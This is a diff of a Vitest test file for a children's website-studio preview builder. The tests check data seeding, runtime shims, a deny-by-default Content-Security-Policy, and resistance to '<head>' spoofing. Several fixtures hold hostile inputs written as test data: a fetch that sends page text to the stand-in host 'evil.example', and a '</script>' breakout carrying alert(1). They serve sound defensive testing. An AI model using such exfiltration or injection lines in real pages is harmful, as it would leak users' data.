@@ -1,10 +1,16 @@
+// @vitest-environment jsdom
 // Website Studio srcdoc builder (creative-code-studio-website-prd). Asserts the
 // runtime contract the backend's Web Critter prompt teaches: page selection +
 // fallbacks, css/js reference inlining with sourceURL + line mapping, server.js
-// injected FIRST among kid scripts, db hydration from data/**.json (+ dbState
-// override), the fetch/app/nav shims + CSP second fence, and asset inlining.
+// injected FIRST among kid scripts, db hydration from top-level data/*.json
+// (+ dbState override), the fetch/app/nav/read-db shims + the deny-by-default
+// CSP second fence, asset inlining — and the STUDIO-OWNED SKELETON security
+// invariant: the shims + CSP precede every kid byte no matter what markup the
+// page contains (a `<head>` hidden in a comment/string must not displace them,
+// or the backend's website fetch( allowance loses both its fences, D-WEB-03).
+// jsdom env: the builder parses the kid page with DOMParser.
 
-import { describe, expect, it } from 'vitest';
+import { describe, expect, it, vi } from 'vitest';
 
 import type { VfsFile } from '../code/codeApi';
 import {
@@ -133,10 +139,23 @@ describe('buildSitePreview — the site runtime shim + CSP fence', () => {
     expect(srcDoc).toContain('it is not valid JSON');
   });
 
-  it('nested data/**.json seeds key on the filename (no directory)', () => {
+  it('a NESTED data/**.json is NOT a seed — skipped with a kid-visible warn (PRD §3.4)', () => {
     const files = [text('index.html', page('')), text('data/shop/items.json', '[1]')];
     const { srcDoc } = buildSitePreview(files);
-    expect(srcDoc).toContain('{key:"items",path:"data/shop/items.json"');
+    expect(srcDoc).not.toContain('{key:"items"');
+    expect(srcDoc).toContain('"data/shop/items.json"');
+    expect(srcDoc).toContain('is not part of db — only files directly inside data/');
+  });
+
+  it('top-level seeds cannot collide: data/pets.json seeds, data/shop/pets.json does not', () => {
+    const files = [
+      text('index.html', page('')),
+      text('data/pets.json', '[1]'),
+      text('data/shop/pets.json', '[2]'),
+    ];
+    const { srcDoc } = buildSitePreview(files);
+    expect(srcDoc).toContain('{key:"pets",path:"data/pets.json"');
+    expect(srcDoc).not.toContain('path:"data/shop/pets.json",text');
   });
 
   it('a seed containing </script> cannot break out of the shim tag', () => {
@@ -159,21 +178,102 @@ describe('buildSitePreview — the site runtime shim + CSP fence', () => {
     expect(srcDoc).toContain('var carried = null');
   });
 
-  it('ships the app/fetch/nav shims before any kid script', () => {
+  it('a non-JSON-safe dbState (BigInt from kid postMessage) degrades to the seeds — never throws', () => {
+    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
+    const dbState = { n: BigInt(1) } as unknown as Record<string, unknown>;
+    const { srcDoc } = buildSitePreview(SITE, { dbState });
+    expect(srcDoc).toContain('var carried = null');
+    expect(errorSpy).toHaveBeenCalledWith(expect.stringContaining('not JSON-safe'));
+    errorSpy.mockRestore();
+  });
+
+  it('ships the app/fetch/nav/read-db shims before any kid script', () => {
     const { srcDoc } = buildSitePreview(SITE);
     const shimAt = srcDoc.indexOf('window.app = {');
     expect(shimAt).toBeGreaterThan(-1);
     expect(srcDoc).toContain('window.fetch = function');
     expect(srcDoc).toContain('__airbotixSiteNavigate');
+    expect(srcDoc).toContain('__airbotixSiteDb'); // Home's live-db read channel
     expect(srcDoc).toContain('the sandbox blocks the outside internet');
     expect(shimAt).toBeLessThan(srcDoc.indexOf("app.get('/api/pets'"));
   });
 
-  it('carries the connect-src none CSP meta as a second fence', () => {
+  it('carries the deny-by-default CSP meta as a second fence', () => {
     const { srcDoc } = buildSitePreview(SITE);
     expect(srcDoc).toContain(
-      `<meta http-equiv="Content-Security-Policy" content="connect-src 'none'">`,
+      `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; ` +
+        `script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; ` +
+        `media-src data: blob:; font-src data:; connect-src 'none'">`,
     );
+  });
+});
+
+// The STUDIO-OWNED SKELETON invariant (adversarial-review fix): the shims + CSP
+// must precede EVERY kid byte, no matter what the page contains — the injection
+// point is never located by matching markup in untrusted HTML.
+describe('buildSitePreview — skeleton beats <head> spoofing (security)', () => {
+  /** Position of the fetch shim vs. the FIRST kid byte in the document. */
+  const fenceHolds = (srcDoc: string, kidMarker: string) => {
+    const shimAt = srcDoc.indexOf('window.fetch = function');
+    const cspAt = srcDoc.indexOf('Content-Security-Policy');
+    const kidAt = srcDoc.indexOf(kidMarker);
+    expect(shimAt).toBeGreaterThan(-1);
+    expect(cspAt).toBeGreaterThan(-1);
+    expect(kidAt).toBeGreaterThan(-1);
+    expect(shimAt).toBeLessThan(kidAt);
+    expect(cspAt).toBeLessThan(kidAt);
+  };
+
+  it('always emits the studio skeleton first', () => {
+    const { srcDoc } = buildSitePreview(SITE);
+    expect(srcDoc.startsWith('<!doctype html>\n<html><head><meta charset="utf-8">')).toBe(true);
+  });
+
+  it('a <head> hidden in a COMMENT cannot displace the shims/CSP', () => {
+    const files = [
+      text(
+        'index.html',
+        `<!--<head>--><html><body><script>fetch('https://evil.example/?d='+document.body.innerText)</script></body></html>`,
+      ),
+    ];
+    const { srcDoc } = buildSitePreview(files);
+    fenceHolds(srcDoc, "fetch('https://evil.example");
+  });
+
+  it('a <head> hidden in a SCRIPT STRING LITERAL cannot displace the shims/CSP', () => {
+    const files = [
+      text(
+        'index.html',
+        `<html><body><script>var s = "<head>"; fetch('https://evil.example/x')</script></body></html>`,
+      ),
+    ];
+    const { srcDoc } = buildSitePreview(files);
+    fenceHolds(srcDoc, "fetch('https://evil.example/x')");
+  });
+
+  it('a page with NO <head> at all still gets the shims first and its scripts inlined', () => {
+    const files = [
+      text('index.html', '<body><h1>Hi</h1><script src="script.js"></script></body>'),
+      text('script.js', "console.log('no-head page');"),
+    ];
+    const { srcDoc, scriptRanges } = buildSitePreview(files);
+    fenceHolds(srcDoc, "console.log('no-head page');");
+    expect(srcDoc).toContain('<h1>Hi</h1>');
+    expect(scriptRanges.some((r) => r.path === 'script.js')).toBe(true);
+  });
+
+  it('a literal </script> in a kid js file cannot truncate the studio tag (ranges stay true)', () => {
+    const files = [
+      text('index.html', page('<script src="script.js"></script>')),
+      text('script.js', 'var s = "</script><script>alert(1)</script>";\nconsole.log(s);'),
+    ];
+    const { srcDoc, scriptRanges } = buildSitePreview(files);
+    // Escaped inside the tag — the raw close sequence never appears mid-content.
+    expect(srcDoc).toContain('var s = "<\\/script><script>alert(1)<\\/script>";');
+    const range = scriptRanges.find((r) => r.path === 'script.js')!;
+    expect(range.end - range.start).toBe(1); // both lines survived in ONE script
+    const lines = srcDoc.split('\n');
+    expect(lines[range.end - 1]).toContain('console.log(s);');
   });
 });
 
